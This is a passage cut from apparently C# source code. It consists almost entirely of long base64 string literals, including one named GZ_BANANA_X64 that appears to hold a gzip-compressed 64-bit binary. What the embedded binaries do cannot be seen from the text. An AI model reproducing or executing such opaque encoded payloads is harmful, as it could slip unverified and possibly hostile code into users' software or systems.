            + "ONuFHYA61WbbhOsy12Psddxfbl3M/Hcp7Gozf7HKe7r6msvWP1xtHpyz1lq7FzM/YBjHnaZuT4Wlwny36ZzNMt2NjfRNt95qOd/g"
            + "AmiJDU0enHNfrj3d02ft91R0jXYFkpKSNhDODymH+7z5jtlXxxE0k6B/Te1s+NJTYbvN3bSOQtNVdwj3hA1brX1sv9c5BTWgaxUE"
            + "jGeYrlHLWPXt9kemdpfN8vhiX/+Y6/PWUfP9CRsG0e68D/Yf/LiABeOglp5NyMvqQXXuy/1XQWW1uanb1Xa+B8ck1DMrARYyDBTd"
            + "PdSLTlN737Tp28Ee8xcjFAKu83rfdVC9sBddD30FMqOXDjI36DQ1QJeae7EKFCEWQUbZh5bQjkKs274wDJX0oeXWW44Rm6fmAjRB"
            + "rTpzniOs56HPpq5Wi2CKqX0ZWEZlljmNbTeJy4aJ5N8yjPmetRx8A416PbUz3FfVpweNvQ9NDf2ttQ1yO5posnJzxC1s26jOjl3o"
            + "dl8MgE3phHyCYWxuV5vHsZ8QT1FbIR70RYR+kmF6JwYbWkf1xZSi3tefohWdA2B8hR1joY7zdFJhVm6Z6H1ouKFot2P3IVgtnT3f"
            + "mB9B9PkF0DgZApn+xcxK8WALnae9hk57HLau2nsuB7tj499t3LahH7vW77Y1Upsy+9H7zsfVPjDf5PPU5lOIV4G2tvfjhIJOsqtZ"
            + "RByY2KBoPG1zc3bbnHPAeL7/im4AfQUMGDV/iISpKXcG5yFM4RFKGm5WNZIILJhwotJ6n+syaQZac3T0nybDNj2IQee43X49zYNF"
            + "a3n/TDotuj53tWV6UJFtmMRKlWX4hAe7UN098LDVBrGddqSMQiDhnGj2gBRH6/dcqrFaaP3em2Zz+xlbQ68H3UQFjRXlZ/zS2naz"
            + "p22W1u5ov9ixyIvi2Lqr0+QpZ72orq2pbdRTbpvTeGntQNW3TT5PJ7SQRiV6jI77zs6aC1lUg4EDzd0jNZX5FPCetZZXnwaJo7RC"
            + "X49xsrrHdLaYqmz8sm3IOldjN5+v6ymjEqapwRnbnMdk8GJCq+X670PDoAMadoRsAai2wdYwTCGX0zLrmPOeA6lpqqu7v78VyEU+"
            + "JBu6aqxALvFhBYiiugaLCwZJGYIccx1nay54pzb4MGI7J1xtIAE2Nd3PopqAqPJb/jPfhzPCVNVl0LNHCfE90ue7XEB/3IcTp/08"
            + "yRsmfSkV8951lOvZCqoXqr/5SuGH+aaz5qm3OB/21jTVcJl9c2fa5k0ZL76y5advWX3B3kK891xqtQ35cMIOuIyXWCX7fsGYD2Mb"
            + "6WQlILMiRIXIokshRI3IEhGiQSRRhGgRWXMJw9l9GbrfdN/jAO9AzzMvBWeh+7I30N2fLwZczu7+41Kgv7VUWqW/laOAu6Km0nkD"
            + "lDoogAM7UF1jvue/RBNrVYOrptJuBkbhEPrR0dV52Tp4NES0PCwOEfYbJSGip71UVGeuMkTUPDaECKd5hBK2r2oeu1snBMJpdrcy"
            + "X+NEsX3lbo2hxcYOd2scLRp63K1LaLHzqrt1OS22PHS3Kmmxp93dqqNF65y7dS0tQiNbaBGayPajpyGtdz80NWO4keSjZ4v9mO/p"
            + "agMskle6R6rqmrrbh+wcLMsku1j8uLJAbdiddE2H6vv9uFuCKnYO9qCQjPy4KwLMOeC1VNU19jmmCB5/DVdeUAPxTJNPSFXaNdxX"
            + "Vps9Xxg9pvZQbmLTjuRSnp2DwTS1Uyu4gKOcqD1+bZ6+VV7DkAcLaAUKt1/DnQSY1+2wc8CGhe8a9hE3Z9Ry9+Xqs7UdhKW7jnFC"
            + "0c6JmgvlZ7Zcx1im3QZIn31dtGzD7q7wOio0PrBZzBdCmz5cqa/jyiZ1BBrHEc6zQl5m18B8U+qJPfZz1A8+vpUrsPUw+0xT42Lb"
            + "wP/lZ47dxG5DTieV7GbyF/il7CYmFugTu2vdZkOIhMoOSrZaPJ2Eu90fIoE7TchVJCwv1N3Us8GtUaWjY6C8/66dA/tWkHHjHA6r"
            + "/aK9+pJ3asXSDbcwQdmGjZPrEvKWjOAAgoXQ+nYW8nzbTcMN8O8IJpyeB8Qy0uGEDSM09QP9kjIhXUSmahOyRGSKMiFXRGqVCYUj"
            + "6FrBxu6HzonuEU8baaWEcH4c4sCi6JxoaXKNQgc7v7wIMs0j6H5BpjXQ1FN7y/m4p4HXMTyC202xdsGBhBtzO4LbaoH2kau5i2Fa"
            + "6+kYrq502EMRmUEYMspgf7qTlTKLQrXggBJiVIwjQ2gMarmM3cOdU8MBdIiz0zg3UO6+Nx3AAAHHCy5fNEFPLTAWYmPZCQxqWEFJ"
            + "FoANhG8CF5xkJWs3D/NlFSmPi/BpEc48wJFM0ZByXbnpm1hKq1U8zT5AWaTltKwCWSUtJ6eQsu4BZi0dKVbQ6rvWr9vGwo57+ST2"
            + "xfzQa4HtSSLZEWVM0TWdbEVtNVXjhinsWjPndUPmSBL+c0zhkojbuhmSH2Bz0zI2heNlGyS7WgSBDY2teiVtXUbMNGr2ei526FlH"
            + "+RIx6XEoxSQX2DBNdyNI9vq4QCYF4BCzoveaY2BFrghovFBVuaL4EZo6aKZjKhz5ks4/wghuuWSrCuPEzGAn6HEEjmT1c1xguRgU"
            + "jgJrxCDX0dHrHGh9NDyDJsNxz13RPTJBybrqui4gY2Ypl2wa2maMnXEhsqrOe3o5JWEvDsJKSsKJAMi1sxg4bp91FEgS7OmzuCwA"
            + "1XKHu2mHZWE/rdTdaJwDvHAWB3fjqyy9zXBQtvXL6iZoJn6O6px03iTBCJsGzffiYPShFZbUgimZRiHokgBlEYi4r7bG/oWeXZWs"
            + "Yz0t7Ivkf/vXF0o46pQQ54SEo9UghwTm/vUVEk6qCjlqJeFYCecJyMTG2321E4R4ClIuW2MfqO95wD0ZR3MfMfV5bbOY0vSKKbVP"
            + "TKmGxVTy7JOotb2p6tv2plaLPjYGuV0G78W2GT0bg6a5K1pxMrBy711jRUJegUKfFoP1IEKa/Y4+fQatxy+o+ZSym7vv1lj1Rwn1"
            + "PbTcbi6hnCprr4/IVRBqOdlI+OvHIMuzL7Pdj4zdsAzVTZrO4lYhoQDDUO8jovz4WzhIiPqFT6EJfWc89bCG6OMoDWcFz1cXA/q0"
            + "p4Rm20aPkfJfwlrjnDA/gqZOEoBkgH5Tn9FAix6fpy3x+3Gwnr6iZfuv1D7snGLlNX7qbUU6YcFZy+X2sUE+BEM+ZWB8SBjW72Ob"
            + "/J6WbfP6RIAKgBERoAVgWgSkagkQ84M4yb64zWuNxSH5+48KCnflfLiP3bx5Mys3j/WPKfyxGKhgIdBgwnRsMHYFKPbpOLwjOsf1"
            + "NFzuaAfIOVE7I38ae2E/1/PQ5RAzfHFxsJPZ+lF+YV7G3kOsHGxRjMWFvBFkQZWFz4S8IWHkPoMDv3nb82S6OApFlMt5TER5A3VB"
            + "KpVItosol9MhoryBGJlAkYnmiBNRLicroryBxCClJTydiPIGNgQpDeGliyhvICtIqQkvV0R5A4VBSgV9EFHewIkglUx4p0SUN1Ah"
            + "wzGFczQ/QblwRNUejiQPx2No1tztu043N/Wftw/R64G0ZzFqarnmco+JbTqnz5IA9T79oWdxVACAVYjIsPK0jZkK/YkwRr2PZ5x/"
            + "FsNk6+YNm1ngwpwh+XXsWZxj/a1Os9PIvvzyLKXXrGG7+wGKew5prAZbhbWE/gFPQ0dgn6LPfI6mNQ72DrkiCagBC4P+KAGfCVYz"
            + "TkI1Vg52KPRlz6HJyIODb1BtM9WEK3mwQTc1yHQZLzmdxuHn0LGrWPsVKrRq0ZI4WBNg+kP7WUvQz7CPwcTG9l91uOXGM/U3FUfD"
            + "WVX+1tHOqc4vnZ2nCOtvI1m1Mxc7yC5k69533svLUTQToe+LugrT4iiLycfyZevcSRYNsdqd1+EGaIiNo/dUsHANUzHnQNO5MRZ7"
            + "9NqGdLamp+myfpqyPFMtU4uWogcsY9XXTQ00i7ZMsdHADUv5SuZHGUuD60HLlD6XUi1TOA5FS9HiZs7NsZvTWTBLf2IpplU4AulP"
            + "0jLaUbpUvAJwS2lynm695bG1NOnbqSSsM/ohoUUjsUQ/TdsATrCNmGWYt+AADSfm+uuEtwwrEfthWdAQimxs4O6anFgSWR5WbCE4"
            + "2Vzb6l1tpvbN6ahMvEfLX4ZDKOXT81TxMuqnLrLWzTV+bZi1VTnuly4LJlA4RVkHPY2GZThMsOyA7MTz2FF+j2t+pFyOc69lqupb"
            + "W43xRp95fwIKQHyxEJv+F1AAXA8rbELB+AuoEGOYkLMvYJNwdoC7b4AWrcAc7PpuwE32KfWPLE5A81egD2C3h4pXped98C6Zo8dW"
            + "oIK8Q4c1Qt9KVsQJV949Az1Tgp+J8HnK8fhs7obr9kkRRyNH9bvWr1r30f68g3hL3THsaesleDxdOWsqbVWdU41fkjWeTVAmqQ+w"
            + "7xeMy3GCwUGir9LUbPpGzyhwgOETAc1lCXn6ODFGjgLk9KZPVKCjIOexm1dv16+hMkivey0TsXRFMC9iFlTrsxXYW5z1fAwXKvgY"
            + "xqYsCsxkYBD76vadbJ/R0km651ag19e/tpNETkKen5AJZKElGeliv7EbLtggRPo6va4uA+iVg6QOg0y5cl7Zi4Ew2WMr6T7DX+M+"
            + "QYuN0zXuSlqENZlbyacf5zk4+lpfxO7s3rCV9VZanJB20xJRwsv1nteTBJ0hJpvODSfiMG3eBtur75rvCC5OW4VOYD1TEFiH1Jg0"
            + "YdAg68Bulyb0EjVWx6sDCHvIXlXDdbND2qDXoD5cYMCmf1ZLG690moAVk4LTCfYM4ZLTqXQrQ/ZOnVP933bdXqRDoK2j/woFjunp"
            + "RPC1zbbNwG69RC+ZbHCfVqkPJmeQqNPjRIBtR9WwaYo/CDj02AcBCR4GRvSYQRtMbpKKJ6gmOIP2DDnsC3+CIwDyabtQKRzMRBcG"
            + "2bvQGI+vcwK65pzrulm0C30Cguyug3nv5Lyfk1OY8+EJAv9NJMzK4d4UrpIVBloR7vfFEu0UhvwuhmcJ/Bzxsbvmgrh1Vr4uGW+N"
            + "FMt3Y4ORAjAOKLGFSJBTp+mCcZLr4KZZua2vtgPkYCutOLQbJxF4kb9zOL4bXQCXTGSfz+P6MioH48HLcbtxXYbhwDCSe3yOVnr7"
            + "pPDtRgdDiPU5OnqHd6P/ms6ZH4Gh7h6HY3Y3ZliA6DkY8ltsZhy9XLKfs1k8g03dlhk5hXqmayr7LA57w622mxsysUPUQNDFkjX1"
            + "w4PrPyosPPhBQX4mpiQRd2fhhzl73yeDsCsv5+OTmehQZOiKdCyc9xp9gwF2XVJ60jroFhH4MS+QrCXnqz6LrbHx4cXr5AQgyPho"
            + "G7RtsoKvwozjPWc2d8K94wRhL6HszuGeGUkg1Fc0XiUica+jhnpngwsuhSyzOKKQ/ky3OhsUa6KwVSH2/kj288mY8ZB9grCfp2wW"
            + "7uNf3JSsTNyUnEz+qKTt1P15SVGTw39WUtx67Bu4/UHJTdrETSmJm3SsHE5pq2GdXA3nLsWaNzDcm8YavgbrQVhB3JLxBq5A/VfI"
            + "sb/G2IuHcTj8Hig49AZmF/flqm97rzfXQcQYvvM86r1mayx5A/MZHXG8jycT2VjeaDj/Zpz4bo5mJYxd65v8bMPvWnTnTGD/m6gJ"
            + "t9TN/2ewPsiYJQwZ/RILrcInN4vtAdwbwzVzFk1EY9W34cLVUO01ELQuCwNN3Djs88jOlZztyYqt8GVhphJmLJjvcUD0ZGFPu0bh"
            + "jknMLT+T/RZWAbfAAoPbnN4Hzycfj46rKqPj6t7ouGY8Oq6NextxWGl5KAUnztoIPBXx/AicTrSTb6Pbt6ze0f2w/17QfC4qrHJH"
            + "hdUTUWFN3J5osFYjhcEkMD8rKpx6PCqsM+wJpjo23Hjf/DwVkz0vTy2fn6dJn5+nLYrCE3pVNj8v1To/TzeSjcmYbax2TgQ7xuzF"
            + "LZcYU8VHYmplJKZJi8S0+0WYYHBxJJZ6PhLT9VKsptnrD9o3HImpZiMxddy+CEyTGIlp00SYYF9+JJZaEonpOIptTXolKVjXtw/T"
            + "wk9ZA0dSnFCbeSdCUsdSDLZHwd6tjcRU2ZGY+lgkpimLxLTNFIMdVyh0IzHVeCSmjtkfgWnYSEy7hmKwxwq2kRWJqY5GYurSSExj"
            + "icS0Q/sxtQDW4e6rDEVrTlRctTw6rk6Ljmvyo+PakhA+8EW/IZS7ouMqX3RcPRsd17AHouLaDQeC+9mmc/W+YLv7o+Oq49FxdUV0"
            + "XNMeHdeOhPC6btu5YLux70bFVbrouDo7Oq4pjo5rDe/irAHcYwpFajRUxeRGQdXyaKgmPRqqLcpFK0x99dWD92pvBNsrjY6rmqPj"
            + "6uHouCYmLyquTaS4xxHWbkZ0XHU0Oq6uiI5reqPj2gmK110Nazf+Z1Fx1ZrouDo7Oq45Hh3XVlKcot7bwXYd0XHVdHRczb4XFdek"
            + "Rce1+e9hBoF7+GCbxZGYqiISUzdHYpqhSEw7LcKE3L8kPwJLXRuJ6TLz8ZpjXTIoIwf1Qp5W8XQJT6t5+jxPa3jaytNanh6m9HpB"
            + "H/M+pQV9S3ha0LfhfVz4N77K1l0NLXpB0OMIgiVB0NQXBOuiVE/1R6meuvCDyOqpiR9EVtdlfBBZXVcUpbqu7AN0KFycBAfXEomp"
            + "fJGYeiIS08QejMC0iRTDby5CG2mRmGp/JKY+FolpSiMxbd1BPHX0Xa9ucnxRP5McbGhoHoaKORSdoV4+D0OTNg9Dmy9lqIKNl8zD"
            + "UHHzMNS+eRia2XkY2iU/x+02XJ6xcE1GjqbmMeeELhxWIZwRDqsRPhQOaxA+EQ5rET4fBq+nTfaGw7TJsXCYNhn7IV6G8CbDyUYp"
            + "QlSIpIsQNSKHRIgGkRIRokXEEELWU80OEUI1j4sQqnlRASK4ZaZGLQ9HVGvCEXVGOKLJD0e0x8OQ9cml4YiKC0fUjgI8LguhxJra"
            + "ScXVxPwuh9k8XYBTgHeeZwruVuILQ5iKx3QiTM1jmSJMw2NFIkzLY6dC2HqhjToRJrThE2FCG9OF2B3M0+s/KiBGxn0UhqiU4Yh6"
            + "SziiyQ1HtMcFxNPpHeq/SkwrC0dUlnBE7fsoTng4Bfd3Y5SEr9xALjwc/AIBZDwloWiq56YTD+PNZtNYw/Taw/ztafVZ4GYexns1"
            + "KIJmPLUfxhMifGwgSwMLN0uYa+EGuVTKCx7OgOc+jMm5z1L9DYyvrarntKM1rgjnPP92BH7HcL/pHNw4JhbRry5nXH74UKDK0wf/"
            + "2lCEe7QwVmYR3ifBtRHej7DRqh4twm898wqVFuHCF+SfL6JXvl/3neklxb8ge7SzQ0JhuAjviltO997ofjhGJXsemMemabG73zy2"
            + "8BOU9QbiaMHlXEILHsfyT1DqYsAbUApFl3PNJ/wFt6eNTou0EEBvFzM/CV5vw+E89xP+ztnTVm1vaQKZoyHI09U+BFIlIS30dr0i"
            + "BNDbdcMnGOIAwOFiNeyArSFFkJDhq5GP1oOXMNScEWoOANDQNK0CpGDOoiNBSDBnyZGgFmpO4pGgFjBHdwSNATJozJaQGsGYLFoL"
            + "nubAhXMu1QpFalsR5eNlNGm1+EjwW4FgW2kIEmw7H9JCbbOEtIBtVmobkEHbhkJqBNvGjuC3FLgYJ3E09DsU0GiSkt9LO8IeZRPy"
            + "xiik0yWpBGj2d6g6OTUlSSNgi36P5iTkCcDaUgyWuqvOiTRaNPU5J6b/gFWDX97gDeaiPwZXJeGDN8zD5X/ETTAuVuvIJBU+llv+"
            + "FAePKY1z9OsayYdf9V03tUdcTYc+05WfGfsTpiH4EsW/+LeUobeg3zCprWVxwm+fOBfXAzNb+FYwVobXrkLzIFJf4YWL8UXloe9z"
            + "8IEL3jCejmNYMtfudI1W293t8JLe4zC1wy2raxQuWFu4Blf5mTWn0R64W+UrWk/zgS58dMg8g14R9wgugX1nMBElKJOUB9i20YsB"
            + "uEqFK9XxM6gSvoMCRFQmVvBvEeCHDuNnsb/Agv4yn6NzgcMZmi43++G7Fqmz/HPMWfCLLMB59NjgM5BuVEqNjh14WNUY40E6WatO"
            + "QbqEp5UqDdLx3megMd1LlF1GydQUWlvuo6SSChsomaJRIqm7hKQ2ldZt5slkFZJpl5+BwdDolKgpWfl+wVqNjsScwkE4z0DoJos4"
            + "NI4Vmf8ltd//X1L7c4ek9o8PSQwu+lpiMHNFYnDxFYnBsVclBp+6Op/BrB8FNbxNlf757Vdeo6LJtIk6Sqp11J611ymppS1aeVJF"
            + "zUv/BkmVjjbj40ktVZU9TEm+4yOUTH6Jqjp0g5IpVNU0T6qoqmM3w6LiVlhU3AqLihGJV8tGJF6V35Z41XBb4lXdtxKvNn87n1fT"
            + "RiVedYz+magYk3jVPybxau4diVfH70i8WnRX4lXmO4lXi7+TeDV2XOLVU+MSr7L3JF6tvCf1mvK+xGt19yVeWxuQeM0akHgtfULi"
            + "Nd/EfF7LfiDx2siD+b12aFLitelJideOTUm8FjMt8VrJtMRr8Q8lXit7KPGa/JHEa4ZHEq/pZiReayYkWcb4hJM2i1QKVeSYlXo0"
            + "c07iUf+cxKO5jyUeHX8s8WjR/5V4lCHngugeLSYckUdjF8jm9eipBTKxR9m/kIk9WsmTvEeV/00m9mgdJQWPrl0oE3vUypN8x9O/"
            + "JxN71MeTvEezn5CJPTpCyJBHDz0pE3n0WIwMFiF4agQPAeCFBX0bFfOUDPbOwLB5B8opmPkDmeiJoF9EuZy5P5SJnhaOiyiXsyhW"
            + "JnqSyDwtEz1XLA5S8JQx9kcy0TPHU0EKnkCyi2Wi55GVQQqeTirjZKJnlXUiyuMY+WuZ6DnmoXiZ6KnmtIjyOORLZKInngYR5XLq"
            + "fiwTPQ3NZWWhhzmmZmUCkp2DfZXw0KaOkPBbNXwcvPYFGd0P1HEUsIYAupNPX4HisJNn1/lExPpjK2Ww32qY9AZiXuSLLmeJUPQ4"
            + "4hNRumGS3bJpY5lAwBZfvipIuJwGQognji5JJkn4zZRWK1P5xXk10holHzQOSpPJQiMsU4l0SrKG6vMrMVpSk1N0OCv6Oi2Titxk"
            + "BEn4I6YuIgGpGKdgKi+oLiIRrihSSc1j1DLYu8D6w0uRlhXFaqnRsRoZ7KvAaKEBokBxSiO1ndVKba/UYjWwXTCBaFQoU6RdgOmg"
            + "qEvBujphoq1NxaGDdvg0TYCnYaqRectrg4YV6ToqqFHzS6iPB1KEbJD9kkw4SsBLjWM/QRKKsD+NWSOD3XX9UPMdeFvYNttyN6lk"
            + "DYrAUdfm6rPE/w8k4V1B5xSbXCYhVfKXxaTaICE12Ttkwo9g4YC9JEMmbCnhBb2BkvAcB0jfa7ywcRJP47uQhPcy1fXGsyd3U/Iu"
            + "F/COtF+TZyLJTfdVVvtbOEumRHP66zJ6sjHiz2qHX5c0VPSGLPQUSpPF13ThUdCahTz4JFNlHX8LefRW3dR3/G0RSebEHhFZd/W8"
            + "mPTezv53HAgYXprUDL+WhX5yc1IW/ClO80kMCHopKKczVZH2vxHUULCnHZ/POQhINuwpFNQmJSsyf4OIjiKpBPHvjMdfx5df7DDc"
            + "gJtc+S4EPA4BOJQZD3YaKyhZ9waStYP2L2qbLMPMW0iSI4gVyLQ98eAOLgBEyd54yAdcoHfW9w6PN9/rbWMPIF7DDVTm5sZD9rL2"
            + "dD9cVdNr+FmI8jim80OUsWLtQdTgKG/o7W0r/jkSHgcQjgJeNxDxh9Ge3huuOWM5m5xdJCZVlUfEpHr8aDxMo8Zvmj3VTaR93S+R"
            + "TWmP49g/itnGCus/Idt67WIf/CY59p+DJHQxszhIgiFl/4ako7x+qPZW16WRE7yfKKn8DEkuQMmY38TDuPzd3vy97+5lwc3Fp8Su"
            + "8D9czGxiFry2J/BblklglIyGySNHVCipJCWW+fdtbJCazBFKT+wQSs5PdI9QWQJTwPz/Kzs0Az+iXBCqsor8OXLk+KnGT8/PwA/g"
            + "wlj63QcPcAwcPBfkvjpSwjJyZiWTRP4oGD8DD4AWfL09882de7buYJmNzKukRuOnH/wyiYF/6xbALemCsh3/8FkkM+MpuFRb8FTJ"
            + "7X13Dz+Z+y85k9teej32r+CwLFL5CqMlQPpvNr6duytUd2gRvD/jFUcXkf8Q2xY0Tb3flxFiHo+FIzPWlzKmf4SKhVrPvd6wT/P6"
            + "5NtXPwuJlMTB0zSsG43d+zfoFGraVmYzs4H8YRn2wMIsKtC8DG77RF3cxaxn1jHbiNDWXwlaKp4XaYkm4F8RdUgYOXZMUH4jx7uH"
            + "73EiXCYsgBH158DIMquwG/6cwfyd+5g9v/4s59XGT598XY8hVsDkr0L3rWN2EvO3M3ocuidfX/nu6ozKHWWrsAv/to9lBAGWAQ1P"
            + "7Nj6q0u/eK5kZ4meGSFCcmbBooyc96D2/yKW/mTbZM6fToK9OoKA2Bv/fHXfrz979KqCyUwKs+eRxJ7SJPjtFGnyJ9lNv6DNQOPJ"
            + "jNSER6/qGV8SBtbA4cQMaByGR88sWo0gSECNBBLfekazGp0CIISPnslejV7dRSSoRmp90Wq4rVqQsG1NbjEtut89kXGSqpS9PlKS"
            + "llP6LhilZyxU5cDOBWRckkkbfjGgIsBCJVYDf0A1iH9iCQW3kojZSJpd/Mtq0pEMJdxALZAzvj9WfAqOSMaZqSHjfFKJ4xxiaQlT"
            + "RRicEi6gFvyU+ERQ41CiBeB6CkwosZchv1F4eTLaIMBdv0rN/ZeCDckYBzBOYk//z6Of7tYzp2iN3/zuKTK0VJ40R2vsJoG/lQ+L"
            + "sQ+zdy792Q/36Jk4FdryzB77fgpsUaGKnaTbW4g0DJqeOaGCm6kFle+kvwlS7ZR0vkMDzE9IHUkc7wB/6w5oYHWG/CNgQ2glYOoS"
            + "gkts9M9/X7lDwaTrg0kp8Fvf7yHxhXJm1muYfyDpSRksc3Nn5pv6bXQ2nXotmH9AVCy2atvxw1h1Fzaz8l0Qmtn22nZIcCyzFP/N"
            + "/RiDvf7QzKsw/v/4r/+5/+Wc44cDv/3VKRDjioL9/2Om7fDsPwQnNXQrlGsSfxFMY1JG8e/4xn+xT7lD7AKYUprfY4hAw8Ks9/8H"
            + "3AuSyQcuWliKY9RzZOf28UyQYEsxXkQAOjm9FMcBjAa/f8zsZQ4ziaSR95lDjBpL+wh6AEt7SYUDPFdDKAXTS6t3/iutDpXzgtU1"
            + "fOkgr/JjUt4bLB0m1dP+EDUB5v4h2DnBmzFlkpwY8tKaMow9cF8IzC4LDi2Ah99u/FS/DZJeSOT/AZGch5c3TAAA";
        internal static readonly string GZ_BANANA_X64 =
            "H4sIAAAAAAAC/6VafVRbx5V/pKlN2rQhTQty0qTPcVhLqY31gbGi5uSAG7v4tLbxR2xl29MoHziwbWI2Thw2201Jmw/a7GmUOKel"
            + "6TldsJ1YtVNbIAkEEpIQIAmBhJCEpFDHVvxBsLEdbGEQOHh37p33pPfA7j8bB3vu7965c+fOnTt35pG3M5/5GsMEe+zXw0PtieZh"
            + "qRAwX3EeThDgWwQwxw6zO8t2rGPDkx6L9bK/Mz2fUfHDjSww8rT5zJ2EcaLNYDZ3GoDJgj4pwb9D8ZDZN047bd2wfj3rPFd+I96j"
            + "ZdvLCK+K6hPpMk2ZL9ZpswaUgRressb5DN4y6zzLCBO1hQj+bcHogK/fvHUjGXziBizOrrzHs3bxmsAuKcFvp8PzFpUS6BucRbwx"
            + "2sfFxmysUKGKGoFaHgO1Rk7tCbZs24bNrHeu9ZiLQHliyHwxmEoS+F8Y5kH8j/Rvdtg6TGd7RsyjLbb4aVZaWL2qsFpG2Q+O/Uq4"
            + "4KPREfl/5TO5DGOxw6DBlD5LBs6b+hoJeRfDRFrs12PWoCc81HzAPGrqa/9oqY9wvs4wgAbNgBZJX+W6+sZR06vcBNoM9kg0ASPK"
            + "f40TgD4tNv9kZMTcbxoIXdES+HtiONJtO7Qyvr/ls4h/8EyLbXjO1yZ5LZ/5JsOELjr7YgftB22XnIf99orXcJBA2v1518edEYBq"
            + "X0OTh+eiI237+wO+wdhB77g3VVRU1Eg4d1CO+SPXRVvCaiaolaAF1M7OI7GD/nPmUd84DN18kXAn6Kht14OXPdPQA6aW+5t8RsIw"
            + "3nH7hZZzPbOWnojffr0jMHgh8pF73HZF+xsMop3Vzz+z++U9LBgHvTRsYbXvN6guOjJ4ElS22Jx9kW7Jb3FNsjNTE+BWhoFm+W+p"
            + "F8OWnkDacn6433ZIRyHghk8FToHqut+i62GuQIaowqB5OGzphCmVvo5doAmxCDLW19ESOlGIdf8h43HJG2i57/PQmD/WegyGoFYd"
            + "+LiUsJbBnC1et503xdJzP1hGZe4Pm7pHictqiOR9DGO77GsC38Cg8VjbNfPRlv3DpoEZS+egu63T+gaaaPGZ54hb2O5x3xs4hb5o"
            + "RwpsShJyEcP4o5HuWChNiNuorRAPmrw385nFDDMwOdzpHtewlKLe18jfxI7hITC+9E2MBas55qHCrNQ+OTBjPCvTvYnTh2C1e/pP"
            + "22Yh+up40DSVBRsJ+KBwsfnJ01nDpGMhv7ftciTEbl33o3Wbxt7EqQ1G/Q5qE/MWej98vSUB5lsSsTYJhTgVaGvtW7ihYJLsKhYQ"
            + "fT0mNmia9vuj5qB/Ljxk+njwBPM79BUwYNWMWRK2JvP7zD6ELeyipHG02UEicM/tf0D/hLyeEd+wJEt0zTyQJYJn5Vmiv6dU0Geu"
            + "Iku0XtdmibBNTwn/0dbrUXcjT4RtUbfxDxjQ/qNRt5U2Hb1Rdw9tGvuj7gHa9JyMuqO02TUTdSdps78n6h6jTd9c1D1BmzAI8w42"
            + "YQj1e+gsiLq+GYsr1Du4H3yjYXXvYTjSzQAs4t2+sWars6/neNAMWYPEbMN7GPjQG5KnN53t73oPkzl0CZrhiCTiifcwaQMWHorb"
            + "m62OQGia4On3MDGAGkuz19jSNzTj9mdVSffhsddiix0yxSw9lA1pgS1/pZzyguZWQ/ispYdaYU6Fmojaqn03mZt+HyZUsIB2oLBx"
            + "HyY6MK8vFDQDm2gJ7cM54tlBLY+OtHzY1ktY0vcxHCnqmWw91nSg9H0MRzptgDTa9wVZBQ6fmvdRoemq3247lj2TwAb9+7jxxI5A"
            + "46yEs4T4ABH2YVYhl8s1xJ7gYeqHJDfKCciMtoRlOi20DfzfdCDZgNMurC5/hXQK2shf4BfmzxjpMCd2R9mGvCwJneWUdNtjHsLd"
            + "XJolgasj5EoSlsesoxo2k7kNod6hpsFLQTPYt5ysmzkU8gU7gi2fxKeXLzX+GROP/4xpqqywWv8BLiBYCKNvZp2JmKd71HiW+Nf4"
            + "ASaw/qvEMjLhQtcHODjSD8kLQwJyzerCpIAskRdOCMjV8kLmL+ha3sa+mfBk31ism4zCEs69WU7ko0h3eLLLGRmHCXqOdIBMxV/Q"
            + "/byMO+Xsb/s8fL2/k9NR+xc8DYXaeQfCCbqQ67bD+MiVNGGYtsV6z7QYQsFsRKoJI58y2B9vY8VMXbYX1E9ZRuMBZPCDQa+Iqe+M"
            + "Zzr3EDok7DHNDTVFL7OHMEDA8bzL1YdoUQVrITS24hAGdaDfNEWygK9p8JrEkM98lWEUcjZok3JtJWmrBXipAC834EqWFJO2tcly"
            + "WktplZKjq6gs0jW0rQTZWk5HCWnXGTBrqUlzjHbfsbZsEwsFQdXfcC62mbjd32w/s4IkbOthms7JSelvbZ6QHMGpuczxKGSOIv7/"
            + "0iN4duGpc43kB9Lb3KU7guvlHyaHLoLAhsFW/rC8bHvdEdQcj3X0athQU4OQjIWMQtKc8h3BfUnJgYQ5laQA1FjLBz4LDS2fEACO"
            + "Y82G5fKjaOqwja4pX5EWaY9iBHd94m+ex7EexUnQagkqxvY5cyohBPlKZUIImnt7B8JD7lnDMTQZqtHowb4xKyWtLVYvkCGOm7T/"
            + "vfuayZPMks3W+P4JTpiUCiDMGJGEggXIPCMGTjThGwcSNpsRjwWgui6aR4NwLKhppz6HaQ7wciMu7rotLL1sGSjbd6TFCcMwzVTn"
            + "VHiUBONQxPRJyIKrD6OwpBdsyTEKwZR4iGlF97W1Bg9p2JUKNRvrYr9P/nlmrUTEUZVkOXIRZ3UxckhgPrO2XMRZo0SOSk44uVYu"
            + "vRFrlqkkQkopFVIKtRUDOnSu51SFFefc42w+3+N02zVVVNBrjHd0X9PUWnGw6EE3hjcrjV8yHSys3iPTNNJ+sOauZCigMdJ+3BHp"
            + "o1TQ1nep1adJWHEvkeMiaJugnGbfQILI5bbnMw+Q0iDZfgHyNvsI2zdr6oODxTpl+RAP/8I9GFia0vbMitrNkOI0Ne1oQuBArB1O"
            + "BU0dpf3NpoOxox0pjbWdH7Z7PN2OsQ7JzzYLQ93egS4YtARM2g40acOmZavZSLhKQMVT1gxVTHg+ARVPJTKUivDGBFQ8lc5QSsLL"
            + "tWWpeEqSoRSEJxVQ8ZTahrOEleFWrnw+otB2YliyUkxqsqpOPNVbLwVO0XOs/aOe47RQjXbSIozkzWQn3exmV1PMwjoPa9IioD2h"
            + "yXPQvE4AyD1EhpWWr9PKNPJ5jPYEx6hw4LG+ccOjG1jggl/JrtI7cB0G3WFb2MQ+8kgjpR9+mO0bBMhKaewGB0TIgVbGEmT3ODBL"
            + "IAtmCweVhnFiZRo0w+GR58xKQGfIDBqpE49yrptpCrqxUjCJGOlE65Fn7bRHMmprqCZM5ZkB651om2UEL+FhU4MTvb+SJZd4FFqZ"
            + "cKH3wVoYX92F3oeDDPcBO3gyFJWaDrSPyrTzWc1J97hn2nMk7Kntwhp3PqvtWkcvOdY2Pvn0L6orZY1dmLEyU4Vc0thLb5pH3HPG"
            + "XpqdguFTcENJ93L3KMhcjIfW2UPOw7kenNFjj1awrf3OEY2EsmLTXdNSD3qA3JNOWTrppuuaLr0R+DO+k222ypPJJF3TmjpKdU3j"
            + "Oug9aLHLHDWzGypYMEtz0IO7EGpgzce0jXZYPaKEQa2Eq3fM3+XUJKgkpCXNmCdTtpERGS+OAZzMGHleTLotrbbL/lTz+fZTzeel"
